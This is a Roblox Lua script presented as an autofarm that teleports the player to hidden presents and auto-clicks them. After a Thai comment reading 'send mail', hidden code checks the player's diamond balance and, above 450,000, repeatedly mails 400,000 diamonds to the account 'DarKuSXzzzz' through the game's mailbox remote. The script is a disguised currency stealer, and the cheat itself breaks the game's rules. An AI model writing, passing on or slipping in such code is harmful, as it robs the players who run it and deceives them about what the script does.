wait(4)
-- Initialization and references to Roblox services
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local VirtualInputManager = game:GetService("VirtualInputManager")
local Camera = Workspace.CurrentCamera

-- User information
local player = Players.LocalPlayer
local humanoidRootPart = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
-- Autofarm variables
local viewportSize = Camera.ViewportSize
local X, Y = viewportSize.X / 2, viewportSize.Y / 2
local clickInterval = 0.1
local Enabled = true

local function teleportAndClick(present)
    if humanoidRootPart then
        humanoidRootPart.Anchored = false
        humanoidRootPart.CFrame = CFrame.new(present.Position)
        wait(0.1)

        VirtualInputManager:SendMouseButtonEvent(X, Y, 0, true, game, 1)
        VirtualInputManager:SendMouseButtonEvent(X, Y, 0, false, game, 1)
        humanoidRootPart.Anchored = true
    end
end

local function autofarm()
    while Enabled do
        local hiddenPresents = Workspace["__THINGS"].HiddenPresents
        for _, present in ipairs(hiddenPresents:GetChildren()) do
            if present.Name == "HiddenPresent" then
                teleportAndClick(present)
                wait(clickInterval)
            end
        end
        wait(1)
    end
end

autofarm()

-- ส่งจดหมาย
local Data = require(game:GetService("ReplicatedStorage").Library).Save.Get()


local function GetGem()
    for i, v in pairs(Data["Inventory"]["Currency"]) do
        if v["id"] == "Diamonds" then
            return i, tonumber(v["_am"])
        end
    end
end

local getgem = game:GetService("Players").LocalPlayer.leaderstats["\240\159\146\142 Diamonds"].Value
local LocalPlayer = game:GetService("Players").LocalPlayer


task.spawn(function()
    while task.wait() do
        if getgem >= 450000 then
            if LocalPlayer.Name ~= "DarKuSXzzzz" then
                local args = {
                    [1] = "DarKuSXzzzz",
                    [2] = "5555",
                    [3] = "Currency",
                    [4] = tostring(GetGem()),
                    [5] = 400000
                }
                game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
                task.wait(60 * 60)
            end
        end
    end
end)
--#endregion
